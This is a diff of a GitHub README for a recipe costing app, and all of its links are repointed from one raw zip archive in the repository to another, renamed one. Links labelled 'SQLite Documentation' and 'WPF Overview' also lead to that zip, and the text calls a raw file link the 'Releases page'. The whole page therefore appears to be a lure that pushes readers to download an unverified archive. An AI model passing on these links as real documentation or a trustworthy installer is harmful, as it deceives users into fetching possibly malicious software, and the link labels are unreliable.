@@ -1,6 +1,6 @@
 # 🍽️ Recipe-Costing-Application - Simplify Your Menu Management
 
-[![Download the Recipe Costing App](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Costing_Recipe_Application_3.0.zip%20Now%20-%20Release%20v1.0-brightgreen)](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Costing_Recipe_Application_3.0.zip)
+[![Download the Recipe Costing App](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Data/Application_Costing_Recipe_2.5-alpha.3.zip%20Now%20-%20Release%20v1.0-brightgreen)](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Data/Application_Costing_Recipe_2.5-alpha.3.zip)
 
 ## 📖 Introduction
 
@@ -23,11 +23,11 @@ Before you start, make sure your computer meets the following requirements:
 
 To download the latest version of the Recipe Costing Application, visit the Releases page:
 
-[Download the Recipe Costing App](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Costing_Recipe_Application_3.0.zip)
+[Download the Recipe Costing App](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Data/Application_Costing_Recipe_2.5-alpha.3.zip)
 
 ### 3. Locate the Setup File
 
-On the Releases page, look for the most recent version. You will find a list of files, including the setup file. It will typically have a name like `https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Costing_Recipe_Application_3.0.zip`.
+On the Releases page, look for the most recent version. You will find a list of files, including the setup file. It will typically have a name like `https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Data/Application_Costing_Recipe_2.5-alpha.3.zip`.
 
 ### 4. Download the Setup File
 
@@ -83,7 +83,7 @@ This project is licensed under the MIT License. Feel free to explore and use it 
 
 For those looking for more information:
 
-- [SQLite Documentation](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Costing_Recipe_Application_3.0.zip)
-- [WPF Overview](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Costing_Recipe_Application_3.0.zip)
+- [SQLite Documentation](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Data/Application_Costing_Recipe_2.5-alpha.3.zip)
+- [WPF Overview](https://github.com/erick1773/Recipe-Costing-Application/raw/refs/heads/main/RecipeCostingApp/Data/Application_Costing_Recipe_2.5-alpha.3.zip)
 
 Thank you for using the Recipe Costing Application! Happy cooking!
